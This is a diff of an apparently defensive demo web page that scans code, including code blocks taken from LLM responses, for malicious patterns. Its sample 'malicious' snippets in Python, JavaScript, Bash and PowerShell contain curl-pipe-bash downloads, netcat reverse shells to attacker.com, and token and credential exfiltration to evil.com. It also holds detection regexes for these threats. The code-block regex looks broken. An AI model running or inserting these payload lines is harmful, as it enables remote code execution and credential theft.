@@ -614,13 +614,7 @@
             <div class="tab-content" id="llm-tab">
                 <div style="margin-bottom: 1rem;">
                     <label style="display: block; margin-bottom: 0.5rem; font-weight: 600;">Simulate LLM Response</label>
-                    <textarea class="code-editor" id="llmEditor" rows="10" placeholder="Paste an LLM response with code blocks here...
-
-Example:
-```
-def safe_function():
-    return 'hello'
-```"></textarea>
+                    <textarea class="code-editor" id="llmEditor" rows="10" placeholder="Paste an LLM response with code blocks here..."></textarea>
                 </div>
                 <button class="btn btn-primary" id="scanLLM">Extract & Scan Code Blocks</button>
                 <div id="llmResult" class="hidden"></div>
@@ -663,9 +657,7 @@ def safe_function():
     </div>
 
     <script>
-        // ========================================
         // STATE MANAGEMENT
-        // ========================================
         const state = {
             policies: {
                 'reverse-shell': { enabled: true, threshold: 0.8 },
@@ -711,76 +703,27 @@ def safe_function():
             ]
         };
 
-        // Sample code snippets
+        // Sample code snippets - FIXED: removed markdown link syntax
         const SAMPLE_CODE = {
             python: {
-                clean: `def analyze_data(df):
-    """Safe data analysis function"""
-    return df.describe()
-
-# Calculate statistics
-mean_value = df['column'].mean()
-print(f"Mean: {mean_value}")`,
-                malicious: `import os
-import subprocess
-
-# Backdoor installation
-os.system('curl http://evil.com/malware.sh | bash')
-subprocess.call(['nc', 'attacker.com', '4444', '-e', '/bin/sh'])`
+                clean: 'def analyze_data(df):\n    """Safe data analysis function"""\n    return df.describe()\n\n# Calculate statistics\nmean_value = df["column"].mean()\nprint(f"Mean: {mean_value}")',
+                malicious: 'import os\nimport subprocess\n\n# Backdoor installation\nos.system("curl http://evil.com/malware.sh | bash")\nsubprocess.call(["nc", "attacker.com", "4444", "-e", "/bin/sh"])'
             },
             javascript: {
-                clean: `function validateInput(input) {
-    const trimmed = input.trim();
-    return trimmed.length > 0;
-}
-
-// Process user data safely
-const result = validateInput(userInput);`,
-                malicious: `// Steal authentication tokens
-fetch('http://evil.com/steal', {
-    method: 'POST',
-    body: JSON.stringify({
-        token: localStorage.getItem('auth'),
-        password: document.getElementById('pwd').value
-    })
-});
-
-// Execute obfuscated code
-eval(atob('bWFsaWNpb3VzIGNvZGU='));`
+                clean: 'function validateInput(input) {\n    const trimmed = input.trim();\n    return trimmed.length > 0;\n}\n\n// Process user data safely\nconst result = validateInput(userInput);',
+                malicious: '// Steal authentication tokens\nfetch("http://evil.com/steal", {\n    method: "POST",\n    body: JSON.stringify({\n        token: localStorage.getItem("auth"),\n        password: document.getElementById("pwd").value\n    })\n});\n\n// Execute obfuscated code\neval(atob("bWFsaWNpb3VzIGNvZGU="));'
             },
             bash: {
-                clean: `#!/bin/bash
-# Safe file backup script
-backup_dir="/backup"
-source_dir="/data"
-
-tar -czf "$backup_dir/backup.tar.gz" "$source_dir"
-echo "Backup completed"`,
-                malicious: `#!/bin/bash
-# Download and execute malware
-curl http://evil.com/payload.sh | bash
-
-# Open reverse shell
-nc attacker.com 4444 -e /bin/bash`
+                clean: '#!/bin/bash\n# Safe file backup script\nbackup_dir="/backup"\nsource_dir="/data"\n\ntar -czf "$backup_dir/backup.tar.gz" "$source_dir"\necho "Backup completed"',
+                malicious: '#!/bin/bash\n# Download and execute malware\ncurl http://evil.com/payload.sh | bash\n\n# Open reverse shell\nnc attacker.com 4444 -e /bin/bash'
             },
             powershell: {
-                clean: `# Safe PowerShell script
-$files = Get-ChildItem -Path "C:\\Data"
-foreach ($file in $files) {
-    Write-Host $file.Name
-}`,
-                malicious: `# Exfiltrate credentials
-$creds = Get-Credential
-Invoke-WebRequest -Uri "http://evil.com/steal" -Method Post -Body $creds
-
-# Execute remote payload
-IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`
+                clean: '# Safe PowerShell script\n$files = Get-ChildItem -Path "C:\\Data"\nforeach ($file in $files) {\n    Write-Host $file.Name\n}',
+                malicious: '# Exfiltrate credentials\n$creds = Get-Credential\nInvoke-WebRequest -Uri "http://evil.com/steal" -Method Post -Body $creds\n\n# Execute remote payload\nIEX (New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1")'
             }
         };
 
-        // ========================================
         // POLICY HANDLERS
-        // ========================================
         document.querySelectorAll('[data-policy]').forEach(toggle => {
             toggle.addEventListener('change', (e) => {
                 const policy = e.target.dataset.policy;
@@ -793,38 +736,31 @@ IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`
                 const policy = e.target.dataset.threshold;
                 const value = parseFloat(e.target.value);
                 state.policies[policy].threshold = value;
-                document.getElementById(`${policy}-threshold`).textContent = value.toFixed(1);
+                document.getElementById(policy + '-threshold').textContent = value.toFixed(1);
             });
         });
 
-        // ========================================
         // LANGUAGE SELECTOR
-        // ========================================
         document.querySelectorAll('.lang-btn').forEach(btn => {
             btn.addEventListener('click', (e) => {
                 document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
                 e.target.classList.add('active');
                 state.currentLanguage = e.target.dataset.lang;
-                console.log('Selected language:', state.currentLanguage);
             });
         });
 
-        // ========================================
         // TAB NAVIGATION
-        // ========================================
         document.querySelectorAll('.tab').forEach(tab => {
             tab.addEventListener('click', (e) => {
                 const tabName = e.target.dataset.tab;
                 document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                 e.target.classList.add('active');
                 document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-                document.getElementById(`${tabName}-tab`).classList.add('active');
+                document.getElementById(tabName + '-tab').classList.add('active');
             });
         });
 
-        // ========================================
         // MANUAL CODE SCANNING
-        // ========================================
         document.getElementById('scanCode').addEventListener('click', () => {
             const code = document.getElementById('codeEditor').value;
             if (!code.trim()) {
@@ -846,9 +782,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`
             }
         });
 
-        // ========================================
         // LLM RESPONSE SCANNING
-        // ========================================
         document.getElementById('scanLLM').addEventListener('click', () => {
             const response = document.getElementById('llmEditor').value;
             if (!response.trim()) {
@@ -858,15 +792,12 @@ IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`
             extractAndScanCodeBlocks(response);
         });
 
-        // ========================================
         // CORE SCANNING LOGIC
-        // ========================================
         function scanCodeBlock(code, language, source) {
             const patterns = MALWARE_PATTERNS[language] || [];
             const scores = {};
             const triggered = [];
 
-            // Simulate pattern matching
             patterns.forEach(({ pattern, threat, score }) => {
                 const regex = new RegExp(pattern, 'i');
                 if (regex.test(code)) {
@@ -874,7 +805,6 @@ IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`
                 }
             });
 
-            // Apply policy thresholds
             let verdict = 'clean';
             for (const [threat, score] of Object.entries(scores)) {
                 const policy = state.policies[threat];
@@ -884,7 +814,6 @@ IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`
                 }
             }
 
-            // Escalate to malicious if multiple threats or very high confidence
             if (triggered.length > 1 || (Object.keys(scores).length > 0 && Math.max(...Object.values(scores)) > 0.90)) {
                 verdict = 'malicious';
             }
@@ -895,7 +824,6 @@ IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`
         }
 
         function extractAndScanCodeBlocks(response) {
-            // Extract code blocks from markdown
             const codeBlockRegex = /``````/g;
             const matches = [...response.matchAll(codeBlockRegex)];
 
@@ -917,7 +845,6 @@ IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`
         }
 
         function findEvidence(code, threat) {
-            // Extract actual evidence from code
             const evidencePatterns = {
                 'reverse-shell': [/nc\s+[^\s]+\s+[^\s]+/i, /curl.*\|.*bash/i, /wget.*\|/i, /IEX\s*\(/i],
                 'credential-theft': [/password|token|auth/i, /localStorage\.getItem/i, /Get-Credential/i],
@@ -946,36 +873,34 @@ IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`
             const verdictText = verdict === 'clean' ? '✓ Clean Code' : 
                               verdict === 'malicious' ? '✗ Malicious Code Detected' : '⚠ Review Required';
 
-            container.innerHTML = `
-                <div class="scan-result">
-                    <div class="result-header">
-                        <span class="result-badge ${verdictClass}">${verdictText}</span>
-                        <span style="margin-left: auto; color: #718096; font-size: 0.9rem;">
-                            Language: ${language.toUpperCase()} | SHA-256: ${hash} | Latency: ${latency}ms
-                        </span>
-                    </div>
-                    ${triggered.length > 0 ? `
-                        <h4 style="margin-bottom: 1rem; color: #4a5568;">Detected Threats</h4>
-                        <div class="threat-patterns">
-                            ${triggered.map(({ threat, score, evidence }) => `
-                                <div class="threat-item">
-                                    <div class="threat-label">${threat.replace(/-/g, ' ').toUpperCase()}</div>
-                                    <div class="threat-details">${(score * 100).toFixed(1)}% confidence</div>
-                                    <div style="font-size: 0.8rem; color: #e53e3e; margin-top: 0.25rem; font-family: monospace;">"${evidence}"</div>
-                                </div>
-                            `).join('')}
-                        </div>
-                    ` : `
-                        <p style="color: #718096; font-style: italic;">No malicious patterns detected</p>
-                    `}
-                </div>
-            `;
+            let html = '<div class="scan-result">';
+            html += '<div class="result-header">';
+            html += '<span class="result-badge ' + verdictClass + '">' + verdictText + '</span>';
+            html += '<span style="margin-left: auto; color: #718096; font-size: 0.9rem;">';
+            html += 'Language: ' + language.toUpperCase() + ' | SHA-256: ' + hash + ' | Latency: ' + latency + 'ms';
+            html += '</span></div>';
+
+            if (triggered.length > 0) {
+                html += '<h4 style="margin-bottom: 1rem; color: #4a5568;">Detected Threats</h4>';
+                html += '<div class="threat-patterns">';
+                triggered.forEach(({ threat, score, evidence }) => {
+                    html += '<div class="threat-item">';
+                    html += '<div class="threat-label">' + threat.replace(/-/g, ' ').toUpperCase() + '</div>';
+                    html += '<div class="threat-details">' + (score * 100).toFixed(1) + '% confidence</div>';
+                    html += '<div style="font-size: 0.8rem; color: #e53e3e; margin-top: 0.25rem; font-family: monospace;">"' + evidence + '"</div>';
+                    html += '</div>';
+                });
+                html += '</div>';
+            } else {
+                html += '<p style="color: #718096; font-style: italic;">No malicious patterns detected</p>';
+            }
+            html += '</div>';
+
+            container.innerHTML = html;
             container.classList.remove('hidden');
         }
 
-        // ========================================
         // TELEMETRY
-        // ========================================
         function logScanEvent(language, verdict, threatCount, source) {
             const timestamp = new Date().toLocaleTimeString();
             state.logs.unshift({ timestamp, language, verdict, threatCount, source });
@@ -989,19 +914,20 @@ IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`
                 container.innerHTML = '<p style="text-align: center; color: #718096; padding: 2rem;">No scans logged yet</p>';
                 return;
             }
-            container.innerHTML = state.logs.map(log => {
+            
+            let html = '';
+            state.logs.forEach(log => {
                 const actionClass = log.verdict === 'clean' ? 'clean' : 
                                    log.verdict === 'malicious' ? 'malicious' : 'review';
-                return `
-                    <div class="log-entry">
-                        <span class="log-time">${log.timestamp}</span>
-                        <span class="log-lang">${log.language.toUpperCase()}</span>
-                        <span class="log-action ${actionClass}">${log.verdict.toUpperCase()}</span>
-                        <span style="color: #718096;">${log.threatCount > 0 ? `${log.threatCount} threats` : 'clean'}</span>
-                        <span style="color: #718096; margin-left: 1rem;">[${log.source}]</span>
-                    </div>
-                `;
-            }).join('');
+                html += '<div class="log-entry">';
+                html += '<span class="log-time">' + log.timestamp + '</span>';
+                html += '<span class="log-lang">' + log.language.toUpperCase() + '</span>';
+                html += '<span class="log-action ' + actionClass + '">' + log.verdict.toUpperCase() + '</span>';
+                html += '<span style="color: #718096;">' + (log.threatCount > 0 ? log.threatCount + ' threats' : 'clean') + '</span>';
+                html += '<span style="color: #718096; margin-left: 1rem;">[' + log.source + ']</span>';
+                html += '</div>';
+            });
+            container.innerHTML = html;
         }
 
         function updateMetrics(verdict) {
@@ -1015,7 +941,6 @@ IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`
 
         // Initialize
         updateLogDisplay();
-        console.log('Malicious Code Detection Demo initialized');
     </script>
 </body>
 </html>
